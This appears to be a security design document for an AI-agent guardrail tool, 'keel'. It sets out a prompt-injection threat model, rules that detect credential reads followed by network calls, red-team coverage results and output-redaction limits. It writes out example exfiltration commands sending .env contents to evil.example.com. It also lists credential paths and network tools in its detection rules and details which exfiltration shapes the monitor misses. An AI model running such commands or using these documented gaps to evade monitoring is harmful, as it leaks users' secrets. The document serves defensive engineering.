# Exfiltration and the lethal trifecta — threat model, coverage, and honest limits

This document exists because "keel blocks exfil" is not a claim keel makes, or
should let a reader infer. It states precisely what the shipped rules do,
what they measurably catch, and what they cannot see at all.

## The threat model

Simon Willison's "lethal trifecta" names three conditions that, together, let
an AI agent leak private data to an attacker:

1. **Untrusted content** — the agent reads text it did not choose to trust
   (a file, a web page, a tool result, a issue/PR body) that can steer its
   own behavior via prompt injection.
2. **Private data access** — the agent can read secrets: credential files,
   API keys, SSH keys, cloud config.
3. **Exfiltration path** — the agent can move data somewhere an attacker
   controls: the network, a public paste site, a commit pushed to a remote
   the attacker can read.

All three legs together are what make the attack work. Remove any one leg
and there is no exfil.

**Keel addresses leg 2 → leg 3 only. Leg 1 — prompt injection itself — is
UNSOLVED by keel and by this document.** Keel has no model of "trusted"
versus "untrusted" content. It cannot tell a legitimate instruction in a
CLAUDE.md file from an attacker's instruction hidden in a GitHub issue the
agent was asked to summarize. If an agent is steered by injected content into
reading a credential file and sending it out, keel's mitigation is a
*downstream* one: it watches for the resulting secret-access-then-egress
*pattern*, not the injection that caused it. A user who wants leg-1 coverage
needs a different tool (content provenance / injection classifiers) layered
on top — keel does not compete with those and makes no claim to replace them.

## What ships

Four rules in the default ruleset compose the mitigation, in increasing
order of severity:

| rule | type | action | level | fires on |
|---|---|---|---|---|
| `paste-site-exfil` | command | prompt | sprint | `curl`/`wget` to a known paste-site host (pastebin, hastebin, transfer.sh, …), independent of any prior read |
| `secret-file-read-without-egress` | command | warn | sprint | a Bash `cat`/`less`/`head`/`strings`/`xxd`/`base64` read of a credential-shaped path, regardless of what happens next |
| `no-exfil-flow-cross-call` | flow | **warn** | sprint | the SAME read-then-sink pattern as `no-exfil-flow` below, but checked against a disk-persisted, session-scoped store instead of in-memory state — see "Cross-call correlation for `keel hook` hosts" below |
| `no-exfil-flow` | flow | deny | **protect** | a session that reads a credential-shaped path, THEN later (same session, any turn) makes any network-shaped call |

`no-exfil-flow` is the core of this mitigation: a `level: protect` floor,
undialable at any speed setting, that hard-blocks the trifecta's leg-2→leg-3
composition once observed. It is implemented by `FlowTracker`
(`packages/core/src/enforce/flow-tracker.ts`): a tool call that reads a path
matching `sources` (`.env*`, `.ssh/**`, `*.pem`, `.git-credentials`,
`.aws/credentials`, `.config/gcloud/**`, keychains, `.npmrc`, `.netrc`) — via
a path argument (`path`, `file_path`, `filePath`, `file`, `dest`,
`destination`, `target_file`, `notebook_path`, or an `apply_patch`-style
body — the same `argPath()` helper the filesystem floors use) OR a
Bash-native read verb (`cat`, `less`, `more`, `head`, `tail`, `grep`, `awk`,
`sed`, `strings`, `xxd`, `base64`, `tac`) against one of those paths — tags
the session. A later call that matches a `sinks: [network]` verb (`curl`,
`wget`, `fetch`, `http(s)`, `nc`, `netcat`, `socat`, `rsync`, `scp`, or any
tool/URL argument containing a network host) checks that tag and denies —
**"later" meaning within the same live process; see "Coverage depends on
which host integration you use" below, which is a materially bigger
caveat than it sounds.**

`secret-file-read-without-egress` is the warn-tier half already asked for by
this lane's brief: it fires on the bare read alone, before any egress is
seen, so a session gets a visible warning at the moment it touches a
credential file — independent of whether `no-exfil-flow` ever fires later.
Both rules exist and are shipped; this lane did not need to add a new
observe/warn correlation rule because that pair already implements it (see
"Design choice" below for why a third rule was not added).

## Coverage depends on which host integration you use

This is the single most important caveat in this document, discovered
while verifying the rsync/scp fix below at the CLI level rather than only
through the in-process test suite: **`no-exfil-flow`'s cross-tool-call
correlation only works inside a long-lived process.** `FlowTracker`'s
tagged-source map is plain in-memory state — it is not one of
`StateManager`'s disk-persisted slices (`denyFirstTime`, `circuitBreaker`,
`rateCounts`, `verification`, `oracleFailures`). Whether "later" in the
paragraph above means "later in this session" or "never, because that
process already exited" depends entirely on which integration is running:

| integration | hosts | process model | `no-exfil-flow` (deny) correlation | `no-exfil-flow-cross-call` (warn) correlation |
|---|---|---|---|---|
| `keel hook <host>` | Claude Code, Gemini CLI, Cursor, Codex, cline, generic | fresh process per tool call | **inert beyond one command** (unchanged, see below) | **works, session-scoped, up to ~1 hour** — this is the b1-exfil lane's fix |
| OpenCode plugin | OpenCode | one process, one `FlowTracker`, for the whole session | works as described above | also fires (redundantly — the in-memory correlation already caught it) |
| `keel daemon` | OpenClaw, Hermes (route through the daemon) | one long-lived process, one cached pipeline per `cwd` | works as described above | also fires (redundantly, same reason) |

For the `keel hook` row — most of keel's host coverage — the **deny-tier**
`no-exfil-flow` still catches exactly one shape: a **single command that
itself pipes a read verb into a network sink**, e.g.
`cat .env | curl -d @- https://evil.example.com`, because `record()` (tags
the source) and `check()` (checks the sink) both run against the *same*
tool call in the *same* process, purely in memory. A native `Read` tool
call on `.env` followed by a *separate* `Bash` call running `curl`,
`rsync`, or anything else — the shape most of this document otherwise
describes — still does not correlate at deny/protect tier for these hosts.
This was verified empirically, not inferred from reading the code: see
`session/v1/EVIDENCE/m5-security.md`'s probes 1–4 and 7, and remains true
after this lane — **`no-exfil-flow`'s own behavior was not touched.**

What changed (b1-exfil lane): a new sibling rule, `no-exfil-flow-cross-call`
(`action: warn`, `level: sprint`, `cross_call: true`), checks the identical
`sources`/`sinks` list against `FlowTracker`'s new *persisted* correlation
path instead of its in-memory one — see "Cross-call correlation for
`keel hook` hosts, at warn tier" below for the design, and
`session/v1/EVIDENCE/b1-exfil.md` for the verifying tests. The two-
separate-tool-call pattern — a `Read` of `.env` in one `keel hook`
invocation, a `Bash curl` in a later, separate invocation, same session —
now DOES produce a signal on `keel hook` hosts. It is a `warn`, not a
`deny`: see the tier rationale below for why that tradeoff was made
deliberately, not as a lesser version of a fix that was really meant to be
a hard block.

This remains a partial, not complete, closure of the coverage gap. `keel
daemon`'s own docstring still states the long-term architectural direction
("ONE engine, ONE runtime, thin clients... enforcement STATE live in
exactly one process instead of being duplicated per integration"); this
lane adds a bounded, TTL'd, warn-tier correlation store to `FlowTracker`
rather than that larger unification.

## Design choice: why this ships as `deny`/`protect`, not `observe`/`warn`

The brief for this lane's mitigation asked to "prefer observe/warn over
hard-block for the correlation... a legit build often reads a token and hits
the network." `no-exfil-flow` already ships harder than that recommendation
— it is a `level: protect` deny, not a warn. That was a deliberate prior
decision (see `SECURITY.md`'s self-protection section), and it is kept here
rather than softened, for two reasons specific to this rule's shape:

- **The source list is narrow and credential-shaped**, not "any secret
  ever." A build reading `package.json` and later `curl`ing an API never
  fires at all — `package.json` doesn't match any `sources` glob, so
  nothing gets tagged and there is no rule to soften. A build reading your
  own repo's `.env.local` (matches `**/.env*`) and later `curl`ing an API
  DOES fire — and that one is intended, not a false positive to design
  around: the rule's entire premise is that "read a credential file, then
  touch the network" is the correct thing to interrupt on, in the same
  live process, regardless of how routine the read felt.
- **Softening it would leave the described mitigation without a hard
  backstop.** The warn-tier `secret-file-read-without-egress` already
  covers the low-cost, low-friction "you touched a secret file" signal.
  Making the read-THEN-egress composition itself only a warning would mean
  a session that trips both rules gets two warnings and nothing stops it —
  which is a materially weaker mitigation than what already ships.

The honest cost of keeping it a hard deny is stated plainly in the next
section: it has a real, accepted false-positive surface.

## The false-positive surface (real, not hypothetical)

`FlowTracker.check()` does **no payload correlation**. It answers two
independent questions — "did any source path get tagged this session" and
"is this call a network-shaped sink" — and ANDs them. It does not, and
architecturally cannot, know whether the bytes flowing through the sink call
are related to the bytes that were read.

Concretely: a session that runs `cat .env` at turn 1 to sanity-check local
config, then at turn 40 runs `rsync -av dist/ user@deploy-host:/srv/app/` to
ship a completely unrelated build artifact, **denies** — at a `level:
protect` floor, undialable. This is a real, working-workflow false positive,
not a theoretical one. It is accepted, not fixed, because there is no
principled way to distinguish that case from the genuine attack from inside
a session-scoped taint tracker without deeper content inspection that keel
does not do (and, per the leg-1 point above, could not reliably do even with
more work — a sufficiently obfuscated exfil payload looks like ordinary
data). If this FP surface is a problem for a specific project's normal
workflow, the mitigation is `rules.yaml` at the project or local scope; the
default is a hard floor because a false "your deploy step got interrupted,
approve it" is a cheaper failure mode than a silent secret leak.

## Measured coverage

`no-exfil-flow`'s adversarial catch rate is tracked in `SECURITY.md`'s
bypass-resistance table (v0.4 phase-3 red-team sweep,
`session/v04/EVIDENCE/phase-3-redteam.md`): **n=4, 25% (1/4)**, unchanged
from v0.3. The documented miss list from that sweep was `curl -d @.env`
(single combined command), `scp`, and `rsync`.

This M5 lane closed two of those three misses: `rsync` and `scp` joined
`matchesSink`'s monitored verb list (`packages/core/src/enforce/flow-tracker.ts`).
Verified through the real `EnforcementPipeline` — the same classes
`keel daemon` and the OpenCode plugin construct — both in-process
(`packages/cli/src/__tests__/fixture-harness.test.ts`'s "rsync of a
previously-read .env is caught by the flow tracker" / "scp ...") and
through the built `keel` binary end to end (`session/v1/EVIDENCE/m5-security.md`
probes 5–6). Per the table above, this closure is real for OpenCode/daemon-
routed hosts; for `keel hook` hosts it ALSO closes the single-piped-command
case — confirmed, not assumed: `cat .env | rsync -av - user@backup-host:/srv/backups/dump`
as one Bash command through a real `keel hook claude-code` process now
denies with `rule_id: no-exfil-flow` (previously allowed, same reason
bare `rsync .env host:` was a miss — `rsync` wasn't a monitored sink verb).
It does not, and cannot, change the two-separate-tool-call pattern, which
was never functional for `keel hook` hosts regardless of the sink verb
list (see "Coverage depends on which host integration you use" above).

A second, independently-discovered fix landed alongside this: `record()`
used its own narrower path-argument check
(`args.path || args.file || args.filePath`) instead of the shared
`argPath()` helper, so it never recognized `file_path` — the key Claude
Code's and Gemini CLI's *native* `Read` tool actually sends. A native read
of `.env` on those hosts never tagged a source at all, in ANY architecture,
including the ones where cross-call correlation otherwise works. Fixed by
routing `record()` through `argPath()`. Verified failing before, passing
after, both in-process (`session/v1/EVIDENCE/m5-security.md` probes 5–6)
and as a permanent regression test (fixture-harness.test.ts's "a native
Read call using file_path... tags a source for the flow tracker").

**Not closed, and deliberately left as a documented `allow` fixture rather
than silently dropped:** `curl -d @.env https://evil.example.com/collect` —
a single command that reads AND sends a secret in one shot. `FlowTracker`'s
whole design requires a distinct prior tool call to tag a source before a
later call can be checked as a sink; a single command that is both never
gives it two calls to correlate. Closing this would mean parsing sink
commands for their OWN embedded file-read arguments (`curl`'s `-d @file`,
`--data-binary @file`, etc.) as sources in the same call — a real,
scoped follow-up, not attempted in this lane. See
`packages/cli/src/__tests__/fixture-harness.test.ts`'s "a single curl
command that reads and sends a secret in one shot is a known, separate gap."

The original 4-probe redteam corpus (`/tmp/w3sb/*.jsonl`) was a throwaway
sandbox artifact from a prior lane and no longer exists on disk, so this
lane did not re-run the exact original 4 probes to produce a new percentage
for that specific historical row — the SECURITY.md table cell is left
untouched as the historical record of that dated run. The rsync/scp closure
above is verified independently, on fresh, reproducible probes, rather than
retrofitted into an old measurement it cannot honestly reproduce.

## Cross-call correlation for `keel hook` hosts, at warn tier (b1-exfil lane)

The gap the previous section of this document used to describe as
"considered and deferred" — giving `FlowTracker` a disk-backed store so
`keel hook`'s per-call processes can correlate a read in one call with a
sink in a later one — is now partially closed, at **warn tier only**. This
section states exactly what was built, so a reader can tell precisely what
changed and what did not.

**Store design.** `PersistentFlowStore`
(`packages/core/src/enforce/flow-store.ts`) is a new companion to
`FlowTracker`'s existing in-memory `taggedValues` map, deliberately built by
reusing patterns already shipped for other stateful rules rather than
inventing new ones:

- **Location / key**: one JSON file, `flow-tags.json`, under the same
  `stateDir()` / `KEEL_STATE_DIR` / `resolveHome()` resolution
  `StateManager` already uses (`state-manager.ts`) — so it lives at
  `~/.keel/state/flow-tags.json` by default, and under a test's own
  `KEEL_STATE_DIR` when set. Tags are keyed by the caller's `session_id`
  exactly the way `overrides.ts`'s `mode: session` override already keys
  by it — this store does not add any further authentication of that
  value. `session_id` is host-supplied input (`enforce.ts`'s own comment
  on where it comes from is the honest caveat: on some hosts it is not
  independently verified either), so this store inherits that same
  trust boundary rather than closing it — a different problem, out of
  scope for this lane, and worth stating plainly rather than implying the
  new store is more trustworthy than the value it is keyed on.
- **Locking**: every read-modify-write cycle (`recordTag`) runs under
  `withFileLock`/`acquireLock` (`file-lock.ts`) — the exact lock
  `StateManager` and `overrides.ts` already use, including its stale-lock
  reclaim and its documented fail-safe (a lock that cannot be acquired
  within its bounded timeout still runs the mutation, unlocked, rather
  than skipping it or hanging the hook). Verified under real concurrent
  OS processes, not just in-process, in
  `packages/core/src/enforce/__tests__/flow-store-concurrency.test.ts`
  (mirrors `state-manager-concurrency.test.ts`'s method exactly).
- **TTL**: `FLOW_TAG_TTL_MS = 1 hour`. Long enough to span a realistic
  multi-turn agent session (read a token early, act on it many turns
  later) without keeping a stale tag alive indefinitely; enforced on both
  write (pruned before every persist) and read (filtered again on every
  `getTags`), so an idle session's tags age out even if nothing else ever
  touches that session again.
- **Bounds**: `MAX_TAGS_PER_SESSION = 50` (per session) and
  `MAX_SESSIONS = 200` (distinct sessions retained, least-recently-active
  evicted first) — an on-disk equivalent of `FlowTracker`'s own
  in-memory "keep last 1000" cap, so the file cannot grow without limit
  even inside the TTL window.
- **Fail-safety**: a lock timeout, a corrupt file, or any other read/write
  failure degrades to "no correlation this call" — `recordTag` becomes a
  no-op, `getTags` returns `[]` — never a thrown exception that could
  crash a hook invocation, and never a hang. This is safe specifically
  *because* the store backs a warn/observe-tier rule, not a deny floor —
  see the fail-safe doc comment on `PersistentFlowStore` itself for the
  explicit statement that it must never be reused to back a
  `level: protect` rule under this same fail-open-on-corruption posture.

**Wiring**: `packages/cli/src/commands/enforce.ts`'s `initEnforce()` — the
single choke point behind `keel hook`, `keel test`, and `keel evaluate` —
now constructs `FlowTracker` with a `PersistentFlowStore`, on by default
(no flag). The OpenCode plugin and `keel daemon` construct their own
`FlowTracker` directly and were not changed — they already correlate in
memory for the whole session and do not need this.

**Tier**: shipped as a *separate* rule, `no-exfil-flow-cross-call`
(`action: warn`, `level: sprint`), not as a change to `no-exfil-flow`
itself, and not as `deny`. This was a deliberate choice, not a lesser
version of a fix that was really meant to be a hard block: the
false-positive window for a persisted, cross-process correlation is the
store's TTL (up to an hour, across MULTIPLE separate tool-call processes),
not one live command — materially wider than `no-exfil-flow`'s own already-
accepted false-positive surface (see "The false-positive surface" above).
A legitimate build that reads a token in one hook call and hits the network
in a later, unrelated one is a routine shape, not an edge case; hard-
blocking it by default would trade a real, common workflow interruption for
a warn-tier signal that already exists in `secret-file-read-without-egress`
and now also on the sink side.
`no-exfil-flow`'s own deny/protect behavior is completely unchanged by this
lane — see the previous section's "was not touched" note.

**What this does NOT close**: the deny-tier gap. A session that reads a
credential in one `keel hook` call and exfiltrates it in a later, separate
one on these hosts still only gets a `warn`, not a `deny` — the hard
block described by `no-exfil-flow`'s own rationale still only fires within
one live process or one piped command on `keel hook` hosts, exactly as
before this lane. Closing THAT gap — promoting the cross-call correlation
itself to a deny/protect floor — was explicitly out of scope: the design
questions the earlier draft of this section raised (session-id trust,
TTL sizing, locking) are answered above for the warn-tier version, but
promoting to deny would need the false-positive rate actually measured
against real workflows first, not asserted from a design review, given
that a floor-level failure mode is a much more expensive mistake than a
warn-level one. Flagged here as the next honest increment, not attempted
in this lane.

## Output redaction (sprint/lane-c2)

Everything above is about the read-THEN-egress *pattern* — `FlowTracker`
watches which tools were called, never what came back from them. This
section is a different mitigation layer: scanning a completed tool call's
OWN output for secret-shaped content and — on exactly one host — actually
rewriting it before the model ever sees it. It exists because a single
`cat .env` or `cat id_rsa` with no subsequent network call trips nothing
above (no sink was ever touched), yet the secret is now sitting in the
model's context regardless.

### What was actually tested, per host — read this before trusting the rest

The question going in was genuinely open: does any host integration let
keel rewrite what a completed tool call's output looks like to the model,
or is that channel purely theoretical? It was tested empirically, live,
zero-spend, against a real `opencode run` session — not inferred from a
type declaration — because a prior, untested assumption in this exact
codebase (`rule-parser.ts`'s old comment on why `mask` was dropped from
`EnforcementAction`) had already gotten this wrong once, citing an
unrelated comment as if it settled the question. The full methodology and
raw transcripts are in
`session/transcripts/opencode-tool-execute-after-mutation-probe.txt`.

| Host | Can keel rewrite what the model already received? | Evidence |
|---|---|---|
| **OpenCode** | **Yes, confirmed live.** `tool.execute.after`'s `output` object is mutable, and the mutation reaches the model — not just the terminal. | A probe plugin redacted a runtime-generated value (`openssl rand -hex 8`, unknowable to the model any other way) from `output.output`; the model's own final reply contained the redacted marker, never the real value. A control run with the same prompt and the mutation removed produced the real value verbatim, ruling out a refusal-pattern artifact. Also confirmed through the REAL install path (`keel install --opencode --project`, unmodified shipped `no-secrets-in-code` rule, real built plugin): `cat`ing a fixture file containing an AKIA-shaped key produced a model reply that never contained the key, and the raw value was absent from the entire isolated `$HOME` (including OpenCode's own session-storage database) afterward. |
| **Claude Code** | **No rewrite. A context-injection warning only.** `PostToolUse` fires after the tool already ran and its result already reached the model — there is nothing left to rewrite. Its documented `additionalContext` field injects text the model sees on its NEXT turn, alongside what it already has, not instead of it. | code.claude.com/docs/en/hooks, quoted directly: "`PostToolUse` fires after a tool call succeeds. It cannot block the tool call... `additionalContext` injects text into Claude's context for Claude to consider." Not live-exercised against an installed Claude Code session in this environment (same "docs" confidence ceiling as the rest of this repo's Claude Code PostToolUse wiring — see docs/integrations.md); the CLI-layer unit/integration tests below exercise the real built `keel hook claude-code` binary end to end, just not a live `claude` process. |
| **Codex, Gemini** | Same as Claude Code — warn only, same citation tier this repo already applies to their `PostToolUse` wiring (docs/integrations.md). | Reuses `hook.ts`'s existing PostToolUse parsing (already shared across these three hosts for exit-code discharge, before this lane). |
| **Cursor, Cline, generic** | **Not wired at all.** These hosts have no `PostToolUse`-shaped parsing in `hook.ts` today (pre-existing gap, unrelated to this lane). | `parsePayload`'s `cursor`/`cline`/`generic` branches never set `postAction`. |

### What was built

**Detection**: `EnforcementPipeline.evaluateOutput()` (`packages/core/src/enforce/pipeline.ts`)
scans a completed tool call's own output text against the exact same
`type: content` regex patterns that already gate what gets WRITTEN to a
file — `no-secrets-in-code`'s shipped patterns, reused verbatim, not a
separate detector. It is a pure function: text in, a verdict plus a
candidate replacement text out. It never mutates anything itself, never
touches `flowTracker`/`sequenceDetector`/rate state, and a `mode: observe`
content rule can never drive a mutation through it — the same restraint
every other rule type already gets from the `evaluate()` observe path,
extended here for the same reason: a rule the user configured to only
WATCH must never itself cause a live change to what the agent sees.

**The correctness invariant this had to earn (found in review, before
shipping — not a hypothetical)**: `no-secrets-in-code`'s eight patterns
were written as DETECTORS ("does this file contain a secret → deny the
write"), not as redaction spans. `AKIA[0-9A-Z]{16}` matches exactly an AWS
access key — the match span IS the secret, safe to replace in place. But
`aws_secret_access_key[\t ]*[:=]` and `BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE
KEY` match only a LABEL or HEADER; the real secret (the key value, the PEM
body) sits AFTER the match, uncovered by it. Blindly replacing the match
span on one of those would strip the label and leave the actual secret
sitting right next to a `[redacted-by-keel:...]` marker, verbatim — a
false-confidence signal strictly worse than no redaction at all, because
the trace and the marker both say "redacted" while the secret shipped
anyway. `KeelRule.patterns[].redact_span` (opt-in boolean, `types.ts`) is
the fix: only a pattern explicitly marked `redact_span: true` — because its
match span is known to fully cover the secret bytes, not just a nearby
label — can drive a mutation. The shipped rule marks its five full-token
patterns (`AKIA`, `ghp_`, `github_pat_`, `xox[baprs]-`, `sk-`) this way. A
label/header match that is NOT marked `redact_span: true` is still detected
(it contributes to `EnforceResult.redacted_rule_ids` and the message) and
still worth a warning even when it also can't drive a mutation itself —
see `redact_widen` immediately below for the three patterns that now widen
instead of staying label-only forever. Regression coverage for the
redact_span invariant itself — a span-safe match redacting correctly
*while a span-unsafe match in the same output survives fully intact* —
lives in `packages/core/src/enforce/__tests__/output-redaction.test.ts`'s
"redact_span correctness" block and `opencode-plugin/scripts/load-test.js`'s
"redact_span correctness" check.

**Widening a label/header match to cover the secret it precedes
(`redact_widen`, this lane, `fix/output-redaction-span`)**: the three
patterns above that only match a LABEL or HEADER — `aws_secret_access_key
[\t ]*[:=]`, `BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE KEY`, and `-----BEGIN
PRIVATE KEY-----` — do not have their match span turned into `redact_span:
true` (their match still isn't the secret), but each is now marked with
`KeelRule.patterns[].redact_widen` (`'line' | 'pem'`, opt-in,
**output-path-only** — Tier 5's write-side content check in
`evaluateTiers()` ignores this field completely, exactly like
`redact_span`; the write-side deny-on-write decision and its
`secret-confidence.ts` false-positive filter are both untouched by this
field's existence). `evaluateOutput()` uses it to extend the label match
FORWARD, bounded, before adding it as a redaction span:

- `aws_secret_access_key[\t ]*[:=]` → `redact_widen: line`: the value
  typically follows on the same line, so the widened span runs from the
  label to the next newline (or a 4KB bounded cap if no newline is found
  that close — a single-line runaway/adversarial blob must not turn this
  into an unbounded scan).
- `BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE KEY` / `-----BEGIN PRIVATE
  KEY-----` → `redact_widen: pem`: PEM bodies are multi-line, so the
  widened span runs from the label forward to a matching `-----END ...
  PRIVATE KEY-----` footer (inclusive), searched within an 8KB bounded
  window.

Both searches are bounded — a SLICE of the scanned text, not an unbounded
`[\s\S]*?`-shaped regex reaching for a footer that may not exist — because
tool output can be adversarial or simply malformed (truncated, no closing
boundary at all). When no footer/newline is found within the bound, the
match is still redacted up to the bound (never left fully exposed just
because the boundary wasn't found) and the rule id is added to
`EnforceResult.redaction_incomplete_rule_ids` so a caller can tell "widened
and redacted, but the boundary was never confirmed" apart from a clean,
fully-bounded widen. See `pipeline.ts`'s `widenLabelSpan()` and
`WIDEN_LINE_MAX_CHARS`/`WIDEN_PEM_MAX_CHARS`, and `types.ts`'s
`redact_widen` doc comment, for the exact bounds and reasoning. This closes
the gap the rest of this section used to describe as permanent — see "What
this does NOT cover" below for what is still true after this change (only
top-level metadata scanning, the 256KB overall scan bound, the missing
Cursor/Cline/generic wiring, and the single-command combined read+send
case remain out of scope).

**Applying it — OpenCode** (`packages/opencode-plugin/src/plugin.ts`'s
`tool.execute.after` handler): mutates `output.output`, `output.title`, and
every top-level string value of `output.metadata` in place. Metadata is
included because live probing found (run 6 of the transcript above) that
OpenCode's own bash-tool metadata independently duplicates raw stdout
(`metadata.output`) — a redaction that only touched `output.output` would
leave a second raw copy sitting in the object OpenCode persists to its own
session store. A redact-action trace entry is written distinct from the
existing allow/"Tool completed" entry, keyed the same `hook:
'tool.execute.after'` value the pre-existing outcome-telemetry entry
already uses (so it stays correctly invisible to `retrospective.ts`'s
`tool_calls` counter, which keys on `hook === 'tool.execute.before'`
specifically). Runs at every dial, including `sprint` — a deliberate,
stated divergence from the input-side content check's sprint-skip
behavior: that trade-off exists because a BLOCKING content check costs the
agent real friction at the fast dial, and this check never blocks, so
there is no friction to trade away.

**Applying it — Claude Code, Codex, Gemini** (`packages/cli/src/commands/hook.ts`):
`postToolUseOutputText()` best-effort-extracts a completed tool's output
text from a `PostToolUse` payload (tries `tool_response`/`tool_output`,
nested `output`/`stdout`/`content`/`text`/`result` — the same
"try several plausible field names, `undefined` on no match" posture
`postToolUseExitCode` already established, and the same reason: this
repo's sandbox cannot capture a real Claude Code PostToolUse payload live,
so the exact field name is unconfirmed and two independent citations
disagree — the installed `claude-posttooluse.sh` template's own contract
comment names `TOOL_RESPONSE`; a direct fetch of Claude Code's hook docs
for this lane named `tool_output`; both are tried). When something is
extracted and `evaluateOutput()` returns `action: 'redact'`, `hookVerdict`
returns a `hookSpecificOutput: { hookEventName: 'PostToolUse',
additionalContext: ... }` envelope (plus `systemMessage`, the same
belt-and-suspenders pairing `renderVerdict`'s advisory path already uses)
whose text says PLAINLY that keel could not remove the value from what was
already delivered and that it should be treated as exposed. This always
returns exit 0 — the same structurally-can't-block contract every other
post-action path in this file already has, because the call already ran.

### The false-positive surface does NOT transfer from the write-side check

`no-secrets-in-code`'s pattern list was tuned against file content being
WRITTEN — a narrower, more predictable surface than arbitrary tool stdout.
A `sk-[A-Za-z0-9_-]{24,}`-shaped run of characters is a reasonable bet
inside a source file; the same pattern run against a `npm ls` dump, a
lockfile's integrity hash, a lengthy base64 blob, or a JSON API response
body is a real, not hypothetical, false-positive surface this lane did not
measure. Treat a redaction (or, for Claude Code/Codex/Gemini, a warning) as
"keel saw something secret-shaped," not as a calibrated, low-noise signal
in the way the write-side rule has been reasoned about elsewhere in this
document.

### What this does NOT cover, stated plainly

- **Label/header-only pattern matches now redact their value/body too, for
  the three shipped patterns marked `redact_widen`** — see "Widening a
  label/header match" above — a PEM private key body or an
  `aws_secret_access_key=...` value is redacted along with its label on
  OpenCode (the one host that can actually rewrite delivered output; see
  the table above). This closes what used to be a permanent, "considered
  and set aside" gap here. What is still true: the widen is BOUNDED (a
  4KB/8KB cap, not an unbounded scan for the closing boundary) — a match
  that hits its cap before finding a footer/newline is still redacted up
  to the cap, but flagged `redaction_incomplete_rule_ids` rather than
  claimed complete; a THIRD-PARTY custom `type: content` rule that sets
  `redact_span` or `redact_widen` on its own pattern gets the exact same
  treatment, this is not special-cased to the shipped rule.
- **Only top-level `output.metadata` string values are scanned** on
  OpenCode — a tool whose metadata nests a secret inside a further object
  or array is not covered; no other tool's metadata shape has been
  observed besides bash's flat `{output, exit, truncated}`.
- **Scan is bounded** (`MAX_OUTPUT_SCAN_CHARS`, 256KB) — text past that
  bound is not scanned, and the result says so rather than silently
  returning a clean verdict for content it never looked at.
- **Cursor, Cline, generic**: no wiring at all, as stated in the table
  above — this is the SAME pre-existing PostToolUse gap those hosts already
  had for exit-code discharge, not a new one this lane introduced.
- **A single command that reads and transmits in one shot** is out of
  scope for this section the same way it is out of scope for
  `no-exfil-flow` above — redaction happens on ONE tool's own output after
  it runs; it cannot see or interrupt a command that reads a secret and
  sends it over the network within its own execution.

## Considered and deferred: one-repo-per-session

A "session may only touch one repo" guardrail — flagging or blocking when a
session that started in repo A starts reading/writing paths in an unrelated
repo B — was in scope for this lane's brief as an alternative mitigation
shape. It was not built. Reasoning:

- No existing infrastructure binds a session to an originating repo root.
  `cwd` is available per-call, but nothing records "the repo this session
  started in" as session state to compare later calls against.
- A naive version (deny any path outside the session's first-seen repo
  root) would be immediately FP-heavy: monorepo tooling, symlinked shared
  packages, reads of global config (`~/.npmrc`, `~/.gitconfig`), and
  legitimate multi-repo workflows (a script that clones a sibling repo to
  diff against) are all common and would all trip it.
- Getting the FP rate to something shippable needs real tuning data this
  lane did not have time to gather — the same "measured, not asserted"
  discipline this document and `SECURITY.md` hold every other rule to.

This is flagged here as a real, considered mitigation for a real threat (a
compromised session in one repo should not be a free pass to every other
repo's secrets on the same machine) that remains open, not quietly dropped.

## What is not covered, stated plainly

- **Prompt injection / untrusted content itself.** Restated from the top of
  this document because it is the most important limit: keel has no leg-1
  model at all.
- **No payload correlation**, as detailed above — session-level taint only.
- **Single-command combined read+send** (`curl -d @secretfile`), as detailed
  above.
- **No cross-process correlation at DENY tier for `keel hook` hosts**
  (Claude Code, Gemini CLI, Cursor, Codex, cline, generic) — see "Coverage
  depends on which host integration you use" above. The b1-exfil lane added
  a warn-tier version (`no-exfil-flow-cross-call`, session-scoped, TTL'd,
  disk-persisted), which DOES now fire across separate `keel hook`
  processes; the hard-block `no-exfil-flow` rule itself still does not —
  it remains scoped to one live process or one piped command on these
  hosts, same as before this lane. Do not read the new warn-tier rule as
  closing this gap; it is a lower-friction, lower-confidence signal
  layered next to the still-open one, not a replacement for it.
- **Non-file-path sources.** A secret pasted directly into the conversation
  by the user, fetched via an MCP tool call, or read from a database is
  invisible to `FlowTracker`'s `sources` matching — it only tags file-path
  reads (`argPath()`'s key list) and a fixed list of Bash read verbs against
  file-shaped paths.
- **Encoded/obfuscated payloads.** `sources`/`sinks` matching is glob and
  regex over literal strings; base64/hex-encoded secret content or a
  destination host built at runtime (string concatenation, an env var) is
  not decoded or resolved.
- **Non-network exfil paths.** Committing a secret to git and pushing it to
  a remote the attacker can read is a different exfil path this rule does
  not model (other rules may incidentally catch parts of that sequence, but
  not by design as an exfil control).
- **A compromised agent process.** Keel enforces in-process; see
  `SECURITY.md`'s "The agent's own process is the boundary" for what that
  means for every rule, not just this one.

## Bottom line

This is a mitigation against one specific, narrow pattern: an agent that
reads a credential-shaped file and later does something network-shaped.
It is not a prompt-injection defense — that remains completely unsolved by
keel, restated here because it is the single most important limit in this
document — not a general data-loss-prevention system, and not a claim that
exfiltration is "solved."

On the CLI-hook hosts most installs actually use, "later" means two
different things depending on which rule you are looking at, and the
distinction matters: for the hard-block `no-exfil-flow`, "later" still
means "later in the same single command" — that did not change in the
b1-exfil lane. For the new warn-tier `no-exfil-flow-cross-call`, "later"
now genuinely means "later in the session," across separate `keel hook`
processes, bounded by the persisted store's ~1-hour TTL. Treat a
`no-exfil-flow` denial as a real interruption worth looking at; treat a
`no-exfil-flow-cross-call` warning as a lower-confidence, higher-noise
signal worth a glance, not an incident — its false-positive window is
wide by design (see "The false-positive surface" and the tier rationale
above). Treat the absence of either as no evidence of safety beyond the
specific pattern each one checks, on the specific host integration in use.
